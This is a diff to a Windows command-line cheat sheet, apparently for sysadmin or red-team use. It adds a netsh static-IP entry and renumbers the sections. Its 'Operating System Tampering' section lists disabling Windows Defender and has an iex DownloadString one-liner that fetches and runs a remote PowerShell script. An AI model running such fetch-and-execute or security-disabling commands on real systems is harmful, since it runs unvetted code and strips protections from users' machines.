@@ -4,12 +4,14 @@ title: Sysadmin CLI WIN
 parent: Sysadmin
 categories: Sysadmin
 grand_parent: Cheatsheets
+last-modified: 2021-11-17
 ---
 <!-- vscode-markdown-toc -->
 * 1. [Security Checks](#SecurityChecks)
-	* 1.1. [listing kb](#listingkb)
-	* 1.2. [windows firewall status](#windowsfirewallstatus)
-	* 1.3. [windows defender status](#windowsdefenderstatus)
+	* 1.1. [configure ip address](#configureipaddress)
+	* 1.2. [listing kb](#listingkb)
+	* 1.3. [windows firewall status](#windowsfirewallstatus)
+	* 1.4. [windows defender status](#windowsdefenderstatus)
 * 2. [Operating System Tampering](#OperatingSystemTampering)
 	* 2.1. [donwload ps activedirectory module](#donwloadpsactivedirectorymodule)
 	* 2.2. [windows defender: disable](#windowsdefender:disable)
@@ -31,18 +33,23 @@ grand_parent: Cheatsheets
 
 ##  1. <a name='SecurityChecks'></a>Security Checks
 
-###  1.1. <a name='listingkb'></a>listing kb
+###  1.1. <a name='configureipaddress'></a>configure ip address
+```batch
+netsh
+interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
+```
+###  1.2. <a name='listingkb'></a>listing kb
 ```batch
 wmic qfe list full /format:table
 ```
 
-###  1.2. <a name='windowsfirewallstatus'></a>windows firewall status
+###  1.3. <a name='windowsfirewallstatus'></a>windows firewall status
 ```batch
 # logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
 netsh advfirewall show allprofiles
 ```
 
-###  1.3. <a name='windowsdefenderstatus'></a>windows defender status
+###  1.4. <a name='windowsdefenderstatus'></a>windows defender status
 ```batch
 powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
 ```
@@ -51,6 +58,7 @@ powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-Mp
 
 ###  2.1. <a name='donwloadpsactivedirectorymodule'></a>donwload ps activedirectory module 
 ```batch
+#version 1
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
 
